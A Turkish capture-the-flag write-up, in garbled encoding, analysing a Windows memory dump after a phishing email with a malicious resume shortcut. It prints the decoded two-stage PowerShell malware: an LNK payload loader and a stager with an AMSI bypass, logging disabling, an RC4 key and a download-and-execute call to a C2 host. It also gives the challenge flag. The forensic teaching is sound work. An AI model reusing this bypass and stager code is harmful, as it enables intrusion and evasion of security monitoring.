# Sherlock Holmes - Memory Forensics WriteUp

## üìã Challenge Bilgileri

- **Kategori:** Forensics
- **Seviye:** Orta
- **A√ßƒ±klama:** Bir i≈üe alƒ±m g√∂revlisinin sanal bilgisayarƒ±ndan ≈ü√ºpheli trafik tespit edildi. Sorunlu sanal makinenin bellek d√∂k√ºm√º, g√∂r√ºnt√ºleme ve analiz i√ßin aƒüdan kaldƒ±rƒ±lmadan √∂nce yakalandƒ±. ƒ∞≈üe alƒ±m g√∂revlimiz, birinden √∂zge√ßmi≈üiyle ilgili bir e-posta aldƒ±ƒüƒ±nƒ± belirtti. E-postanƒ±n bir kopyasƒ± kurtarƒ±ldƒ± ve referans olarak sunuldu. Bayraƒüƒ± bulmak i√ßin k√∂t√º ama√ßlƒ± yazƒ±lƒ±mƒ±n kaynaƒüƒ±nƒ± bulun ve ≈üifresini √ß√∂z√ºn.

**Verilen Dosyalar:**
- `flounder-pc-memdump.elf` - Bellek d√∂k√ºm√º dosyasƒ±
- `imageinfo.txt` - Volatility profil bilgisi
- `Resume.eml` - ≈û√ºpheli e-posta

---

## üõ†Ô∏è Gerekli Ara√ßlar

### Volatility 3 Kurulumu

Volatility 3, Python tabanlƒ± modern bir bellek forensics aracƒ±dƒ±r.

#### Kali Linux'ta Kurulum

#### pipx ile Kurulum
```bash
sudo apt install pipx
pipx install volatility3
```


---

## üîç Analiz S√ºreci

### Adƒ±m 1: ƒ∞lk Ke≈üif - E-posta ƒ∞ncelemesi

√ñncelikle `Resume.eml` dosyasƒ±nƒ± inceleyelim:
```
Return-Path: <bloodworm@madlab.lcl>
From: Brian Loodworm <bloodworm@madlab.lcl>
To: flounder@madlab.lcl
Subject: Resume

Hi Frank, someone told me you would be great to review my resume..
Could you have a look?

resume.zip [1] 

Links:
------
[1] http://10.10.99.55:8080/resume.zip
```

**üö© ƒ∞lk ≈û√ºpheli ƒ∞≈üaretler:**
- Bilinmeyen g√∂nderici (bloodworm@madlab.lcl)
- Harici bir IP adresine y√∂nlendiren link (10.10.99.55:8080)
- Klasik phishing senaryosu: "√ñzge√ßmi≈üime bakar mƒ±sƒ±n?"

---

### Adƒ±m 2: Sistem Profili Kontrol√º

`imageinfo.txt` dosyasƒ±ndan sistem bilgilerini √∂ƒüreniyoruz:
```
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64
AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
Number of Processors : 2
Image Type (Service Pack) : 1
Image date and time : 2017-10-04 18:07:30 UTC+0000
Image local date and time : 2017-10-04 11:07:30 -0700
```

**√ñnemli Bilgiler:**
- **ƒ∞≈ületim Sistemi:** Windows 7 SP1 x64
- **Bellek D√∂k√ºm√º Zamanƒ±:** 2017-10-04 18:07:30 UTC
- **Profil:** Win7SP1x64

---

### Adƒ±m 3: √áalƒ±≈üan S√ºre√ßleri Listeleme

Bellek d√∂k√ºm√ºnde hangi s√ºre√ßlerin √ßalƒ±≈ütƒ±ƒüƒ±nƒ± g√∂relim:
```bash
vol -f flounder-pc-memdump.elf windows.pslist
```

**üìä √ñnemli √áƒ±ktƒ±lar:**
```
PID     PPID    ImageFileName   CreateTime      
4       0       System          2017-10-04 18:04:27.000000 UTC
272     4       smss.exe        2017-10-04 18:04:27.000000 UTC
476     376     services.exe    2017-10-04 18:04:29.000000 UTC
...
2044    2012    explorer.exe    2017-10-04 18:04:41.000000 UTC
2812    2044    thunderbird.ex  2017-10-04 18:06:24.000000 UTC  <- E-posta istemcisi
496     2044    powershell.exe  2017-10-04 18:06:58.000000 UTC  <- ≈û√úPHELƒ∞!
2752    496     powershell.exe  2017-10-04 18:07:00.000000 UTC  <- √áOK ≈û√úPHELƒ∞!
```

**üö® Kritik Bulgular:**

1. **PID 2812 - thunderbird.exe**
   - E-posta istemcisi aktif
   - Ba≈ülangƒ±√ß zamanƒ±: 18:06:24 UTC

2. **PID 496 - powershell.exe**
   - Parent Process: explorer.exe (PPID: 2044)
   - Thunderbird'den **34 saniye sonra** ba≈ülatƒ±lmƒ±≈ü (18:06:58 UTC)
   - **Anormal davranƒ±≈ü!** Kullanƒ±cƒ± manuel olarak PowerShell a√ßmamƒ±≈ü olabilir

3. **PID 2752 - powershell.exe**
   - Parent Process: ƒ∞lk PowerShell (PPID: 496)
   - ƒ∞lk PowerShell'den **2 saniye sonra** ba≈ülatƒ±lmƒ±≈ü (18:07:00 UTC)
   - **√áok ≈ü√ºpheli!** PowerShell zincirleme (chaining) tespit edildi

**üîç Neden ≈û√ºpheli?**
```
Normal Kullanƒ±m:
User -> Start Menu -> PowerShell (tek s√ºre√ß)

K√∂t√º Ama√ßlƒ± Kullanƒ±m:
Thunderbird (E-posta a√ßƒ±ldƒ±)
    ‚îî‚îÄ> resume.pdf.lnk (K√∂t√º ama√ßlƒ± dosya √ßalƒ±≈ütƒ±rƒ±ldƒ±)
         ‚îî‚îÄ> PowerShell #1 (ƒ∞lk a≈üama payload)
              ‚îî‚îÄ> PowerShell #2 (ƒ∞kinci a≈üama payload - C2 beacon)
```

---

### Adƒ±m 4: PowerShell Komut Satƒ±rlarƒ±nƒ± ƒ∞nceleme

≈ûimdi en kritik kƒ±sƒ±m - PowerShell s√ºre√ßlerinin **ne yaptƒ±ƒüƒ±nƒ±** g√∂relim:
```bash
vol -f flounder-pc-memdump.elf windows.cmdline
```

#### üéØ PID 496 (ƒ∞lk A≈üama PowerShell)
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-win hidden 
-Ep ByPass 
$r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); 
iex $r;
```

**üîë K√∂t√º Ama√ßlƒ± ƒ∞≈üaretler:**
- `-win hidden` ‚Üí Gizli pencere (kullanƒ±cƒ± g√∂rmez)
- `-Ep ByPass` ‚Üí Execution Policy bypass (g√ºvenlik atlatma)
- `[Convert]::FromBase64String()` ‚Üí Base64 decode
- `iex` (Invoke-Expression) ‚Üí Decode edilen kodu √ßalƒ±≈ütƒ±r

**Base64 Payload'u Decode Edelim:**
```bash
echo 'JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7' | base64 -d
```

**Decoded Payload:**
```powershell
$stP,$siP=3230,9676;
$f='resume.pdf.lnk';
if(-not(Test-Path $f)){
    $x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;
    [IO.Directory]::SetCurrentDirectory($x.DirectoryName);
}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
```

**Ne Yapƒ±yor?**
1. `resume.pdf.lnk` dosyasƒ±nƒ± TEMP klas√∂r√ºnde arƒ±yor
2. Dosyadan **3230. byte'tan ba≈ülayarak 9676 byte** okuyor
3. Bu binary veriyi **Base64'ten decode** ediyor
4. Ortaya √ßƒ±kan **PowerShell kodunu √ßalƒ±≈ütƒ±rƒ±yor** (Stage 2)

Bu klasik bir **LNK dosyasƒ± i√ßinde gizli payload** tekniƒüi!

---

#### üéØ PID 2752 (ƒ∞kinci A≈üama PowerShell - BAYRAK BURADA!)
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-noP -sta -w 1 
-enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMARQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBAAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

Bu base64 string √ßok uzun! Decode edelim:
```bash
echo 'JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMARQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=' | base64 -d
```

**Decoded Payload (√ñnemli Kƒ±sƒ±mlar):**
```powershell
# AMSI Bypass
$GRouPPOLiCySEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);
$GRouPPOLICySEtTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;
$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;

[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};

# Network Connection Setup
[SysTem.NeT.SEr VIceP OIntMAnAgER]::ExpEct100COnTinuE=0;
$WC=NEW-OBjEcT SysTEM.NEt.WebClIEnt;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wC.HeaDerS.Add('User-Agent',$u);

# Encryption Key
$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');

# RC4 Decryption Function
$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};

# Cookie Setup
$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");

# C2 Server
$ser='http://10.10.99.55:80';
$t='/login/process.php';

# üö© BAYRAK BURADA! üö©
$flag='HTB{$_j0G_y0uR_M3m0rY_$}';

# Download and Execute
$DatA=$WC.DoWNLoaDDAtA($SeR+$t);
$iv=$daTA[0..3];
$DAta=$DAta[4..$DAta.LenGTH];
-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```

---

## üèÜ BAYRAK BULUNDU!
```
HTB{$_j0G_y0uR_M3m0rY_$}
```

---

## üìù Saldƒ±rƒ± Akƒ±≈üƒ± √ñzeti
```
1. Phishing E-posta
   ‚îî‚îÄ> Brian Loodworm'dan sahte √∂zge√ßmi≈ü e-postasƒ±
        ‚îî‚îÄ> Link: http://10.10.99.55:8080/resume.zip

2. Dosya ƒ∞ndirme ve √áalƒ±≈ütƒ±rma
   ‚îî‚îÄ> Kullanƒ±cƒ± resume.zip'i indirir
        ‚îî‚îÄ> ƒ∞√ßinde: resume.pdf.lnk (k√∂t√º ama√ßlƒ± shortcut dosyasƒ±)
             ‚îî‚îÄ> LNK dosyasƒ± √ßift tƒ±klandƒ±ƒüƒ±nda PowerShell #1 ba≈ülatƒ±lƒ±r

3. ƒ∞lk A≈üama (Stage 1) - PID 496
   ‚îî‚îÄ> PowerShell #1 gizli modda √ßalƒ±≈üƒ±r
        ‚îî‚îÄ> resume.pdf.lnk dosyasƒ±ndan g√∂m√ºl√º payload'u √ßƒ±karƒ±r
             ‚îî‚îÄ> Base64 decode eder ve PowerShell #2'yi ba≈ülatƒ±r

4. ƒ∞kinci A≈üama (Stage 2) - PID 2752
   ‚îî‚îÄ> PowerShell #2 √ßalƒ±≈üƒ±r
        ‚îú‚îÄ> AMSI Bypass (g√ºvenlik atlatma)
        ‚îú‚îÄ> ScriptBlock Logging devre dƒ±≈üƒ±
        ‚îú‚îÄ> C2 sunucusuna baƒülanƒ±r (10.10.99.55:80)
        ‚îú‚îÄ> RC4 ile ≈üifrelenmi≈ü komutlarƒ± indirir
        ‚îî‚îÄ> Komutlarƒ± √ßalƒ±≈ütƒ±rƒ±r (Remote Code Execution)
```

---

## üîç Tespit Teknikleri ve ƒ∞≈üaretler

### PowerShell K√∂t√º Ama√ßlƒ± Kullanƒ±m ƒ∞≈üaretleri
```powershell
# ≈û√ºpheli parametreler
-win hidden              # Gizli pencere
-w 1                     # Gizli pencere (window style 1)
-ep bypass               # Execution policy bypass
-nop                     # No profile
-enc                     # Encoded command

# ≈û√ºpheli komutlar
iex                      # Invoke-Expression (kod √ßalƒ±≈ütƒ±rma)
[Convert]::FromBase64String()  # Base64 decode
New-Object Net.WebClient       # Web istekleri
DownloadString()               # Remote script indirme
```

### Bellek Forensics ƒ∞≈üaretleri
```bash
# ≈û√ºpheli s√ºre√ß ili≈ükileri
explorer.exe -> powershell.exe           # Anormal
powershell.exe -> powershell.exe         # √áok ≈ü√ºpheli
WINWORD.exe -> cmd.exe                   # Makro saldƒ±rƒ±sƒ±
excel.exe -> powershell.exe              # Makro saldƒ±rƒ±sƒ±

# Zaman bazlƒ± analiz
- E-posta a√ßƒ±ldƒ±ktan hemen sonra PowerShell ba≈ülamasƒ±
- PowerShell zincirleme (process chain)
- Beklenmeyen parent-child ili≈ükileri
```

---


---



## ‚úÖ √á√∂z√ºm Adƒ±mlarƒ± √ñzeti

1. ‚úÖ E-posta i√ßeriƒüini inceleyin (phishing tespiti)
2. ‚úÖ `vol -f memory.dump windows.pslist` - ≈û√ºpheli s√ºre√ßleri bulun
3. ‚úÖ `vol -f memory.dump windows.cmdline` - PowerShell komutlarƒ±nƒ± g√∂r√ºn
4. ‚úÖ Base64 payloadlarƒ± decode edin
5. ‚úÖ Bayrak deƒüi≈ükenini bulun: `$flag='HTB{$_j0G_y0uR_M3m0rY_$}'`

---

## üéØ Flag
```
HTB{$_j0G_y0uR_M3m0rY_$}
```


---

